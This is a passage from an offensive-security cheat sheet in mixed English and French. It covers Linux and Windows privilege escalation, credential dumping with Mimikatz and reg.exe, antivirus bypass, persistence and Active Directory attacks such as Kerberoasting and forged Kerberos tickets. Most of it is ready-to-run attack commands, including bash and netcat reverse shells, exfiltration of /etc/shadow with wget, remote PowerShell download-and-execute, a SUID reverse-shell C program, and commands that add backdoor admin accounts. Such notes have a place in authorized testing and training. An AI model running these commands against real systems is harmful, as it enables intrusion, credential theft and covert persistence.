            AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
            TrustedUserCAKeys /home/userca/ca.pub
            AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
            ```
    - Get authrozed keys : `cat authorized_keys`
- Web application configuration file : 
    - `/usr/share/tomcat7/conf/tomcat-users.xml`    
- Chercher PWD dans fichier (casser MDP VNC : https://github.com/jeroennijhof/vncpwd)
<br><br>

- Is mysql running in root without password : `mysql -h localhost -u root -p`

Specific commands:

- Debian
    - Apache config file : `/etc/apache2/apache2.conf` - ` /etc/apache2/sites-available/default`
- RedHat (systemctl status firewalld.service)
- AIX
- FreeBSD
    - Apache config file : `/usr/local/etc/apache22/httpd.conf`
	- Apache log file : /var/log/httpd-access.log
    - Use `fetch` to download files
- OpenBSD
    - The sudo alternative in openbsd is doas
        - cat /etc/doas.conf
        ```
        permit nopass <USER_1> as <USER_2> cmd <COMMAND>
        ```

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

#### Unix automatically

- **Linux Smart Enumeration**
    - `wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh`
    - `curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh`
        - `./lse.sh`
            - There is 3 different level of verbosity `-l0` (default), `-l1`, `-l2`
- **BeRoot for Linux**: On the remote machine do `git clone https://github.com/AlessandroZ/BeRoot.git` then `python beroot.py` 
- **LinEnum**: On the target machine do `./LinEnum.sh -r report -e /tmp/ -t`        
- **pspy**: https://github.com/DominicBreuker/pspy
    - Releases: https://github.com/DominicBreuker/pspy/releases
    - Command line tool designed to snoop on processes without need for root permissions
<br><br>
- Find exploits available kernel exploit: 
    - **Linux Exploit Suggester**: On the target machine do `uname -a` then `dpkg -l`, and in your own machine do `./linux-exploit-suggester.sh --uname <UNAME_OUTPUT> --pkglist-file <DPKG_OUTPUT>`
 
[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Exploitation

---

### Dump credentials from Windows 

Dump hashes from the memory or the registry

- Dump hive with `reg.exe`: 
    - `C:\WIND0WS\system32>reg.exe save HKLM\SAM <FILE>.hiv`
    - `C:\WIND0WS\system32>reg.exe save HKLM\SECURITY <FILE>.hiv`
    - `C:\WIND0WS\system32>reg.exe save HKLM\SYSTEM <FILE>.hiv`
    - Use SecretDump from Impacket to dump credentials from the hives `sudo /usr/local/bin/secretsdump.py -sam sam.dump -security security.dump -system system.dump LOCAL`
    - Main hives folder location : 
        - `HKEY_LOCAL_MACHINE\SYSTEM` : `%windir%\system32\config\SYSTEM`
        - `HKEY_LOCAL_MACHINE\SAM` : `%windir%\system32\config\SAM`
        - `HKEY_LOCAL_MACHINE\SECURITY` : `%windir%\system32\config\SECURITY`
        - `HKEY_LOCAL_MACHINE\SOFTWARE` : `%windir%\system32\config\SOFTWARE`
        - `HKEY_USERS\.DEFAULT` : `%windir%\system32\config\DEFAULT`
        	- Open regedit.exe - clic on HKLM - clic on the menu `file` - `load hive` - named the key
            - Once the hive loaded on the editor, dump it : `reg.exe save "HIVE\CLE" DUMPFILE.HIV`
- Dump LSASS.EXE process: 
    - Procdump
        - Microsoft tool, more discreet, will not rise an antivirus alert. Should always be used in the a RedTeal context.
        - `procdump.exe -accepteula -ma LSASS.EXE <DUMP_FILE>`
        - The dump output file need to be openend with `Mimikatz` from a Windows workstation or virtual machine compatible (version and architecture) with the targeted workstation.
        - Use `sekurlsa::minidump <DUMP_FILE>` to switch in the LSASS context of the dumped file then you use the usual command of `Mimikatz` to dump credentials.
    - Mimikatz
        - Use `sekurlsa::logonPasswords full` to enumerate all possible credentials with one command
            - Check for `sekurlsa::wdigest` or `sekurlsa::credman` for clear text password (Windows < 8.1), `sekurlsa::msv` for LM & NTLM hashes
    - Meterpreter
        - `hashdump` to dump local SAM database
        - `load mimikatz` then `mimikatz_command -f sekurlsa::logonPasswords full`
- Through SMB with CME: 
    - SAM : `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD' -d <DOMAIN> --sam`
    - LSA : `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD' -d <DOMAIN> --lsa`
    - Mimikatz through CME: `crackmapexec smb <IP> '<USERNAME>' -p '<PASSWORD' -d <DOMAIN> --mimikatz-cmd "sekurlsa::logonPasswords full"`
- Windows Credential Editor : WiP 
    - WCE can allow you to load hashes you dump from the memory of a target workstation on your Windows VM. Thereby if you dump credentials from a target workstation of a user that can not connect with RDP you will be able to have his user context in your VM by loading its hashes in memory.

---

### Dump hashes from Unix

WiP

---

### Windows kernel exploit

MS16-032 : `Empire/data/module_source/privesc/Invoke-MS16032.ps1`

---

### Windows configuration exploit

#### Trivial user password

#### Token Kidnapping

- [ms09-012](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2009/ms09-012)
- Récupérer l'exploit ici : `/usr/share/sqlninja/apps/churrasco.exe`
    - `churrasco.exe "net user <USER> <PASSWORD> /add && net localgroup Administrators <USER> /add"`

#### Windows XP upnphost service

- On SP0 and SP1 the upnphost service can be used to escalate privileges
- Use accesschk **version 5.1**
- Set **BINARY mode** when you download it with FTP : `ftp 10.11.1.13` then `binary`
- `accesschk-2003-xp.exe /accepteula`
- `accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula`
- `aaccesschk-2003-xp.exe -ucqv upnphost /accepteula`
- `sc qc upnphost`
- Upload nc.exe on the target via **FTP using binary mode**
- Modify the configuration of the upnphost service
```
C:\Inetpub\wwwroot>sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe <IP> 9999 -e c:\Windows\system32\cmd.exe"
C:\Inetpub\wwwroot>sc config upnphost obj= ".\LocalSystem" password= ""
C:\Inetpub\wwwroot>sc config upnphost depend= ""
C:\Inetpub\wwwroot>net start upnphost
```     

---

### Linux kernel exploit

- **Memodipper**
    - Exploit: https://github.com/lucyoa/kernel-exploits/tree/master/memodipper
    - Download it on the target and run it `./memodipper`
        - Be sure to use a **PTY** otherwise the exploit could not work

---

### Linux configuration exploit

#### Trivial user password

#### Ability to be root

- `sudo -i` 
- `sudo -s` 
- `sudo su`

#### Right to modify /etc/passwd

- `echo root::0:0:root:/root:/bin/bash > /etc/passwd`
    - Removing x means root requires no password anymore
        - Then do `su`

#### Nmap in sudo -l

```
(root) NOPASSWD: /usr/bin/nmap
```
- Lancer nmap en mode interactif : `sudo nmap --interactive`
- Lancer un shell : `nmap> !sh`
- Executer des commandes : `sh-3.2# id`

#### Man in sudo -l

- `sudo man man`
- `!/bin/sh`

#### Text editor in sudo -l

```
(root) NOPASSWD: /usr/local/bin/ht
```
- Lancer ht : `sudo ht`
- Editer le fichier `/etc/sudoers`
- Ajouter `/bin/sh` à la fin de l'entrée de l'utilisateur courant - Sauvegarder
- Lancer un shell root : `sudo /bin/sh`

#### Wget in sudo -l

-  Display a file : `sudo wget -i /etc/shadow`

- Exfiltrate a file : 
	- On the target : sudo wget --post-file=/etc/shadow <IP>
		- Requirements : sudo access or `wget` in sudoers
	- On Kali : nc -nlvp 80

- Overwrite a file : `sudo wget <IP>:<PORT>/shadow -O /etc/shadow`

#### Tar in sudo -l
	
- `sudo -u <USER> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
	
- Create a reverse shell file : `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > <SHELL-FILE>.sh`
- Tar the reverse shell file : `tar -cvf <ARCHIVE-FILE>.tar <SHELL-FILE>.sh`
- Extract the reverse shell and execute it : `sudo -u <USER> tar -xvf <ARCHIVE-FILE>.tar --to-command /bin/bash`
	- `--to-command` : Pipe extracted files to COMMAND
	
#### Sudoedit with two wildcar
```
(root) NOPASSWD: sudoedit /<PATH>/*/*<FILE>
```

- Exploit : https://www.exploit-db.com/exploits/37710

#### Weird homemade SUID file

- Download it locally
- Run it `ltrace <SUID-FILE>` to see what it does

#### Systemctl avec le bit SUID

- Execution de commande avec systemctl (redirection du résultat dans un fichier )
```bash
$ TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "<command> > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ systemctl link $TF
$ systemctl enable --now $TF
$ cat /tmp/output
```

- Reverse shell avec systemctl (en utilisant netcat)
```bash
TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "nc -e /bin/sh <IP> <PORT>"
> [Install]
> WantedBy=multi-user.target' > $TF
$ systemctl link $TF
$ systemctl enable --now $TF
```

- Executer un .sh avec systemctl 
- Créer un fichier
```bash
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 
```
- Configurer systemctl pour l'exécuter
```
[Unit]
Description=root shell
[Service]
ExecStart=/tmp/shelly.sh
[Install]
WantedBy=multi-user.target
```

#### keybase-redirector avec le bit SUID

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  setreuid(0,0);
  system("nc -e /bin/bash <IP> <PORT>");
  return(0);
}
```

#### exim-4.84-3

- `/tmp/root.pm`

```
package root;
use strict;
use warnings;
system("/bin/sh");
```

- `PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps`

#### Injection de commandes dans un script (python/bash)

- `OR $(whoami)`
- `$(/bin/bash)`
- `eval('%s > 1 ' % <USER_INPUT>)`
	- `__import__('os').popen('ping -c 6 <IP>').read()`
		- Can also use `system`
	- `__import__('os').system('nc <IP> <PORT> | /bin/sh')"`
		- Then send a reverse shell on `<IP>:<PORT>`
		
#### Replacing Built-ins command due to an environmental vulnerability

- Contenus vulnérable : `/usr/bin/env echo <TEXT>`
- Modifier la variable d'environnement PATH : `PATH=/tmp:$PATH`
- Prendre en compte la modification : `export PATH`
- Créer un nouveau binaire : `echo /bin/sh > /tmp/echo`
- Ajouter les droits d'exécution au nouveau binaire : `chmod +x /tmp/echo`
- A l'exécution du script vulnérable, c'est notre version `/tmp/echo` qui s'exécutera

#### Generate a new password for root

- Sans sel : `openssl passwd -1` taper entrée et rentrer le password
    - Avec sel : `openssl passwd -1 <SALT>` taper entrée et rentrer le password	

#### Shellshock

- Disclosed on September 2014

#### Capabilities

```
openssl=ep
```
- Dsiaply a file : `openssl enc -in /etc/shadow`
	- Use the openssl which have the capabilities
- Overwrite a file : `cat <FILE> | openssl enc -out /etc/shadow`

```
tcpdump=cap_net_admin
```

- You can user tcpdump to listen on NIC

---

### Bypass anti-virus

- IEExec.exe C:\Windows\Microsoft.NET\Framework64\v2.0.50727
- caspol.exe C:\Windows\Microsoft.NET\Framework64\v4.0.30319
- RunDll32
- regsvr32
- Command of msfvenom
- https://raw.githubusercontent.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/master/regsvcs.cs
    - Follow repo instructions
    - Update the file regsvcs.cs adding the payload generated by msfvenom
        - See below
    - Generate the .DLL using the .DLL and CSC.EXE : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs`
    - On the target device : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe /u \\<IP-KALI>\SHARE\regsvcs.dll`

If loaded directly in memory, the antivirus will not detect the payload. Otherwise, if you upload it on the drive, the antivirus will scan it and could remove it

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Privileged access

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

### Persistence

---

#### Create a new user

- Windows: `net user <USERNAME> <PASSWORD> /ADD` then add the user on the Administrator group `net localgroup administrators <USERNAME> /add`
- Unix: `sudo useradd -ou 0 -g 0 <USERNAME>` then `sudo passwd <USERNAME>`

---

#### Add user to administrative group

- Unix : `usermod -a -G <GROUP> <USERNAME>`

---

#### Migrate with Meterpreter

WiP

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

### Pivoting

---

#### Port forwarding

- Local port forwarding: `ssh -L <LOCALPORT>:<TARGET>:<TARGETPORT> <PIVOT>` will allow you to interact with `<TARGET>` from your local device through the `<PIVOT>` device.
    - Local port forwarding can also be used to attack from your device a service exposed locally on the target (eg: databases)
- Dynamix port forwarding: `ssh -D 127.0.0.1:<LOCALPORT> <USER>@<TARGET>` will create a SOCKS proxy. Any traffic sent to this port is sent to its destination through the SSH server. 
	- To use this server you can do `proxychains <COMMAND> <PARAMETERS>`.
		- Set `<LOCALPORT>` in `/etc/proxychains.conf`

---

#### Proxychains

This tool force any TCP connection made by any application to follow through a given proxy. You can launch tools like nmap, mysql ... with proxychains through a SOCKS server launch through `SSH` or `metasploit`. 

- From a Meterpreter session do `run autoroute -s <IP>` to add a new route, then use `run autoroute -p` to display it. Do `background` to be able to access Metasploit module, then `use auxiliary/server/socks4a` en `run` it.
- From your shell you are now able to do `proxychains <COMMAND> <PARAMETERS>` (update `/etc/proxychains.conf` if necessary).
    - Proxychains will look for `/etc/proxychains.conf` in the current folder firstly, then you can launch a `proxychains` by folder.

---

#### Remote access

Access to a workstation using found credentials.

- From a Windows workstation using a privileged user: `PsExec.exe \\<IP> -u <DOMAIN>\<USERNAME> -p <PASSWORD> -s cmd.exe` will spawn a shell in SYSTEM context
- `python /usr/share/doc/python-impacket/examples/psexec.py <USER>:<PASSWORD>@<IP>`

---

#### Network scan using local tools

- `for i in {1..255}; do ping -c 1 XXX.XXX.XXX.$i; done | grep 'ttl='`
- `nc -zv <IP> 1-1000`
    -  Scanned the first 1000 ports

---

#### SSH Agent Hijacking

ssh-agent load a decrypted copy of the private key into the memory on the local workstation. It also provides a local socket that the SSH client can use to ask it to decrypt the encrypted message sent back by the remote server. The private key stays safely ensconced in the ssh-agent process memory while still allowing you to SSH around without typing in passwords

Sometimes you need to chain SSH sessions. Using `ForwardAgent` in your local SSH configuration will allow you to SSH to device_1 using public key authentifcation then SSH will tunneling your connection and allowing you to authenticate with public key on device_2 from device_1 without leave your private key on device_1.

Enabled "ForwardAgent" -> SSH uses its built-in tunneling capabilities to create another socket on the intermediate server that is tunneled back to the ssh-agent socket on the local workstation. 

Problem, anyone with root privilege on the intermediate server can use your ssh-agent to authenticate to other servers. 
Even if the keys are not installed on the intermediate server, the ssh client programs is able to access the agent running on my local machine

SSH_AUTH_SOCK -> Path to the socket
ssh-add : Let us view/interact with keys in the agent

Enven if the keys are NOT installed in the intermediate server, the SSH client is able to access the agent running on the local workstation

Locally : 

- `env|grep SSH_AUTH_SOCK`
- `ls -l /tmp/launch-<RANDOM>/Listeners`
- ssh-add program lets us view and interact with keys in the agent : `ssh-add -l`
- Configuration on in the ~/.ssh/config : `ForwardAgent yes`

Intermediate server : 

- `env|grep SSH_AUTH_SOCK`
- ssh-add program lets us view and interact with keys in the agent : `ssh-add -l`
- Check connected user : `who`
- Go to root :`sudo -s`
- find the child process of one of his ssh sessions, grab its PID : `pstree -p <TARGET>`
- Look the valie of SSH_AUTH_SOCK : `cat /proc/<PID>/environ`				
- `SSH_AUTH_SOCK=/tmp/ssh-<RANDOM>/agent.16816 ssh-add -l`
- `SSH_AUTH_SOCK=/tmp/ssh-<RANDOM>/agent.16816 ssh <TARGET-USER>@<TARGET-DEVICE>`


- Source : https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

# Active Directory
## Discovery
### Active Directory fingerprinting

- Display Kerberos tickets in memory for this user: `klist`
- Gather domain controller IP: 
    - `nslookup <FULL-DOMAIN-NAME> |grep Address |cut -d":" -f2`
    - `nltest /DCLIST:<DOMAIN_NAME>`
- To find the WSUS server from a Windows workstation of the domain `reg query HKLM\software\policies\microsoft\windows\windowsupdate` value `WUServer`
    - It could be possible from a WSUS server to deploy on WSUS slaves and workstations a malicious application

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Privilege escalation
### MS14-025 (Group Policy Preferences)

- Clear text credentials in SYSVOL policies: look in `<HOST>\SYSVOL\<FOLDER>\Policies\<FOLDER>`
- Credentials in Group Policy Preferences (GPP):
	- To find it: `findstr /I /S "cpassword" *.xml`
	- To break the password: `gp3finder.exe -D <CPASSWORD>(` or manually `echo '<CPASSWORD>' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000`
	- You can also use a `metasploit` module: `post/windows/gather/credentials/gpp`
	- Are use a `Powersploit` module: `Get-GPPPassword`

---

### MS14-068 (CVE-2014-6324)

> This vulnerability enables an attacker to modify an existing and valid TGT by adding the false statement (by modifying the PAC) that the user is a member of sensitive group (as Domain Admins). The DC will validate that TGT, enabling attacker improper access to any resource on the network.

- When a user logs on a domain for the first time, the user name and password are validated by the DC and a domain logon token (TGT) is created and provided to the user.
- The user doesn’t have to re-authenticate to the DC to access resources on the domain, the user simply presents the TGT to the DC and receives a resource access token (TGS).
- The user then provides the resource access token to the server hosting the service.
- The DC trusts all non-expired logon tickets (TGT) since they are signed by the domain’s Kerberos account.

Python Kerberos Exploitation Kit (PyKEK) & Mimikatz: 
- `ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>`. It will saves the forged TGT to a ccache file in the current working directory.<br>
You can grab the SSID through `whoami` when you are logged in as the target user, or use `[Security.Principal.WindowsIdentity]::GetCurrent()` Powershell function.
- `mimikatz.exe kerberos::ptc c:\temp\<TGTFILE.CCACHE> exit`

---

### Unconstrained delegation (KUD)

> An attacker with admin rights on a local server with unconstrained delegation will have access to the TGT of all the users that have been connected to the server

#### Find the delegation: 

- From Windows: https://github.com/samratashok/ADModule
    - `PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
- From Unix: https://github.com/dirkjanm/ldapdomaindump
    - `ldapdomaindump -u "<DOMAIN>\<USERNAME>" -p "<PWD>" <IP>` 
    - Then grep the unconstrained delegation from the DUMP: `grep TRUSTED_FOR_DELEGATION domain_computers.grep`

#### Exploit

- Dump TGT from the memory : `.\Rubeus.exe dump`
- Dump in live the new TGT after each success : `\Rubeus.exe monitor /interval:5`
- Grab the TGS using a TGT : `.\Rubeus.exe asktgs /ticket:<TICKET_BASE64> /service:<SPN> /ptt`

### Contrained delegation (KCD)

> If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation

- Find user with KCD enabled : `Get-NetUser -TrustedToAuth`
    - User has to have an attribute `TRUSTED_TO_AUTH_FOR_DELEGATION`


- With Rubeus : 
    ```
    Rubeus.exe tgtdeleg
    Rubeus.exe s4u /ticket:<BASE64> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE>/<SERVER> /dc:<DOMAIN_CONTROLER> /ptt
    ```
    - `Rubeus.exe s4u /user:<USERNAME> /rc4:<HASH> /impersonateuser:<USER_TO_IMPERSONATE> /domain:<DOMAIN> /dc:<DOMAIN_CONTROLER> /msdsspn:<SERVICE>/<SERVER> /ptt`


- With Impacket : `getST.py -spn <SERVICE>/<SERVER> '<DOMAIN>/<USERNAME>:<PWD>' -impersonate Administrator -dc-ip <IP>`

### Resource Based Constrained Delegation

> WiP

--- 

### Trust relation

> WiP

#### Enumerate

- `nltest /trusted_domains` (installed by default on Windows)
- `dsquery * -filter "(objectClass=trustedDomain)" -attr *`
- `Get-ADTrust` : PowerShell Windows module for Active Directory, use LDAP requests
    - Require RSAT (remote admin tools)
    - `Get-ADTrust -Filter * -Properties *`
    - `(Get-ADForest).Domains | ForEach-Object { Get-ADTrust -Server $_ -Filter * -Properties * }`
- `Get-ForestTrust` et `Get-DomainTrust` : Cmdlets of `PowerView` from `PowerSploit`
    - Powerview is catch by AV, you need to inject it directly in the memory 
        ```
        IEX (New-Object Net.WebClient).DownloadString('https://<IP>:<PORT>/Pw.ps1');
        Get-ForestTrust
        Get-DomainTrust
        ```

---

### PrivExchange

> WiP

---

### Attack paths

> WiP

- Use BloodHound to get a dynamic and graphical representation of the active directory:
    - From a domain workstation:
        - Upload the `SharpHound.ps1` file on a domain workstation
        - Launch `powershell`
        - `Import-Module .\SharpHound`
        - `Invoke-BloodHound -CollectionMethod All` will generate .JSON files and compress them in a .ZIP. Copy the .ZIP in your VM
    - From your computer:
        - Launch neo4J `sudo neo4j console`
        - The HTTP server is launched `http://127.0.0.1:7474/browser/`
        - Start BloodHound `sudo bloodhound`
			- If you get a white screen do Ctrl+R
        - Drag&Drop the .ZIP in BH


---

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Credentials gathering
### Kerberoast / Kerberoasting

This vulnerability enables an attacker to access arbitrary services by exploiting the weakness of service account password. 

- A domain user is able to request TGS from the DC on arbitrary services, even if it has no access on it.
- The TGS is protected by the NTLM hash of the account password.
- If the password is not strong, the hash could be easily break through bruteforce or wordlist.

- List the Service Principal Name (SPN):
    - GetUserSPNs Powershell script: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1')`    
    - Impacket: `./GetUserSPNs.py -dc-ip <DOMAINCONTROLLERIP> <DOMAIN>`
- List of Kerberos tickets that exist in memory:
    - On the CMD & PS: `klist`
    - Meterpreter: `load kiwi` then `kerberos_ticket_list`. Or `kiwi_cmd kerberos::list`
    - Mimikatz: `kerberos::list /export`
    - PowerSploit: `Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'`
- Request the SPN:
    - Impacket: `./GetUserSPNs.py -dc-ip <DOMAINCONTROLLERIP> <DOMAIN>` the output is formatted for `JohnTheRipper` or `Hashcat`
	- Impacket for windows `GetUserSPNs.exe -dc-ip <DOMAINCONTROLLERIP> <FULLDOMAINNAME>/<USER>:<PASSWORD>`
    - Mimikatz: `kerberos::ask /target:<SPN>`    
- Break the ticket:
    - JohnTheRipper: WiP
    - Hashcat: `hashcat -m 13100 -a 0 <REQUESTSPNOUTPUT>`

---

### KRB_AS_REP Roasting

Possible de désactiver la nécessité d’authentification sur certain compte de domaine à la demande d’un TGT 

- Impacket : `GetNPUsers.py <DOMAIN>/ -usersfile <USER-LIST> -format john -outputfile <FILE-LOG> -dc-ip <IP-KDC>`
	- `john <FILE-LOG> --wordlist=<WORDLIST>`
	
- Impacket : `GetNPUsers.py <DOMAIN>/ -usersfile <USER-LIST> -format hashcat -outputfile <FILE-LOG> -dc-ip <IP-KDC>`
	- `hashcat -m 18200 -a 0 <FILE-LOG> <WORDLIST> --force`

---

### DCSync

WiP

---

### Dump NTDS database from de DC

WiP

- vssadmin WiP
- wmic WiP
- With crackmapexec: `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --ntds drsuapi`
- With PowerSploit: 
    - `Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -RemoteDestination "<PATH>\ntds.dit" -ComputerName "<REMOTESERVER>"`
    - `Invoke-Mimikatz -Command '"privilege::debug" "LSADump:LSA /inject"' -Computer <COMPUTERNAME>`
- With metasploit: `use auxiliary/admin/smb/psexec_ntdsgrab`

- Extract and break the hashes
- WiP (esedbexport)
- WiP (ntdsxtract, dsusers.py)
- WiP (JTR)
- WiP (pipal.rb)

---

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Pivoting
### Password spraying

> WiP 

- SprayHound
- CME

---

### Pass The Hash

The PtH vulnerability allow the authentication using only username and password hash without knowing the clear text password. You need to use NTLM hashes, founded in the SAM database of any Windows workstations or the NTDIS database of the domain controller.


- With crackmapexec `sudo crackmapexec smb <IP> -u '<USERNAME>' -H '<LMHASH:NTHASH>'`
- With metasploit `use exploit/windows/smb/psexec` then `set SMBPass <LMHASH:NTHASH>`
- With pth toolkit `pth-winexe -U <DOMAIN>/<USERNAME>%<PASSWORD> //<HOST> <COMMAND>`
- With Impacket `python wmiexec.py -hashes <LMHASH:NTHASH> <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>`

---

### Pass the ticket

WiP 

---

### OverPass-the-Hash (aka Pass-the-Key)

WiP

--- 

### Drop the MIC (CVE-2019-1040)

WiP

---

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Persistance
### Skeleton key

WiP

--- 
### Silver ticket 

A Silver ticket is a valid TGS ticket forged by an attacker. The attacker has to gain knowledge of the password hash for the target service. An attacker with admin rights to the computer or able to run code as local System can dump the AD computer account password hash from the system using Mimikatz. <br>
Most services do not validate the PAC, so a valid TGS generated with the service account password hash can include a PAC that is entirely fictitious.

- `mimikatz "kerberos::golden /user:<USERNAME> /id:<USERRID> /domain:<DOMAIN> /sid:<SID> /target:<TARGETSERVER> /rc4:<NTLMHASH> /service:<APPLICATIONANME> /ptt" exit`

WiP export/use ticket ; impacket ; metasploit

### Golden ticket

A Golden ticket is a valid TGT ticket, encrypted/signed by the domain Kerberos account (KRBTGT) forged by an attacker. Once an attacker has admin access to a Domain Controller, the KRBTGT account password hashes can be extracted using Mimikatz.

- `mimikatz "/kerberos::golden /domain:<DOMAIN> /user:<USERNAME> /sid:<SID> /krbtgt:<NTLMHASH> /ptt" exit`

WiP export/use ticket ; impacket ; metasploit

---

### DCShadow

WiP

---
